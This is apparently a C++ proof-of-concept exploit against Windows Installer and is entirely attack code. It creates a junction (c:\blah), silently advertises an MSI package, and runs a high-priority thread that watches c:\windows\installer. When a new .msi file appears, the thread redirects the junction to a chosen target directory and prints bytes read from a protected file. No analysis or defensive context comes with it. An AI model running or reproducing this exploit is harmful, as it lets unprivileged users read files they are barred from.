#include "stdafx.h"
#include "FileOpLock.h"
#include "ReparsePoint.h"
#include <string>
#include <sddl.h>
#include <iostream>
#include <Msi.h>
#define BUFFERSIZE 400

#pragma comment(lib, "Msi.lib")
const char* targetfile;
bool succeeded = false;
std::wstring s2ws(const std::string& str)
{
	int size_needed = MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), NULL, 0);
	std::wstring wstrTo(size_needed, 0);
	MultiByteToWideChar(CP_UTF8, 0, &str[0], (int)str.size(), &wstrTo[0], size_needed);
	return wstrTo;
}

DWORD WINAPI MyThreadFunction(LPVOID lpParam)
{
	LPCWSTR filename1;
	LPCWSTR root = L"c:\\windows\\installer\\";
	HANDLE hDir = CreateFile(
		L"c:\\windows\\installer",
		FILE_LIST_DIRECTORY,
		FILE_SHARE_WRITE | FILE_SHARE_READ | FILE_SHARE_DELETE,
		NULL,
		OPEN_EXISTING,
		FILE_FLAG_BACKUP_SEMANTICS,
		NULL
	);

	FILE_NOTIFY_INFORMATION strFileNotifyInfo[1024];
	DWORD dwBytesReturned = 0;
	std::wstring extension = L".msi";
	char buff[401];
	std::string targetf(targetfile);
	std::wstring targetfw = s2ws(targetf);
	const wchar_t* targetfww = targetfw.c_str();

	
	while (TRUE)
	{
		ReadDirectoryChangesW(hDir, (LPVOID)&strFileNotifyInfo, sizeof(strFileNotifyInfo), TRUE, FILE_NOTIFY_CHANGE_FILE_NAME, &dwBytesReturned, NULL, NULL);

		filename1 = strFileNotifyInfo[0].FileName;

		std::wstring df = std::wstring(root) + filename1;
		std::wstring::size_type found = df.find(extension);
		if (found != std::wstring::npos)
		{
			ReparsePoint::CreateMountPoint(L"c:\\blah", targetfww, L"");
		}
		if (found != std::wstring::npos)
		{
			LPCWSTR dfc = df.c_str();
			HANDLE hFile;

			
			do {
				hFile = CreateFile(dfc,GENERIC_READ,FILE_SHARE_READ | FILE_SHARE_DELETE | FILE_SHARE_WRITE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,NULL);                
				DWORD  dwBytesRead = 0;
				ReadFile(hFile, buff, 400, &dwBytesRead, NULL);
				if (dwBytesRead > 0)
				{
					succeeded = true;
					for (int i = 0; i < 400; i++) {
						std::cout << buff[i];
					}
					std::cout << std::endl << "press any key to exit";
					return 0;
				}
				CloseHandle(hFile);
				
			} while (TRUE);
			
		}
	
	}
	return 0;
}

void runme() {
HANDLE mThread = CreateThread(NULL,0,MyThreadFunction,NULL,0,NULL);  
SetThreadPriority(mThread, THREAD_PRIORITY_TIME_CRITICAL);
}

int main(int argc, const char * argv[])
{		
	
	
	char splitpath[MAX_PATH];
	char* splitfile;
	GetFullPathNameA(argv[1], MAX_PATH, splitpath, &splitfile);
	std::string path = "c:\\blah\\";
	std::string filename(splitfile);
	char* ptr;
	int    ch = '\\';
	ptr = strrchr(splitpath, ch);
	char* nullbyte = "\0";
	*ptr = *nullbyte;
	targetfile = splitpath;
	


	path.append(filename);
	const char * c = path.c_str();
	CreateDirectory(L"c:\\blah", NULL);
	CreateDirectory(L"c:\\blah2", NULL);
	
	while (succeeded == false)
	{

		ReparsePoint::CreateMountPoint(L"c:\\blah", L"c:\\blah2", L"");
		CopyFileA("file", c, true);
		MSIHANDLE blah;
		LANGID langid = 0x0409;
		runme();
		MsiSetInternalUI(INSTALLUILEVEL_NONE, NULL);
		MsiAdvertiseProductA(c, "c:\\blah\\test", NULL, langid);
		
	}
	ReparsePoint::CreateMountPoint(L"c:\\blah", L"c:\\blah2", L"");
	DeleteFileA(c);
	DeleteFile(L"c:\\blah2\\test");
	RemoveDirectory(L"c:\\blah");
	RemoveDirectory(L"c:\\blah2");
	
	getchar();
	return 0;
}

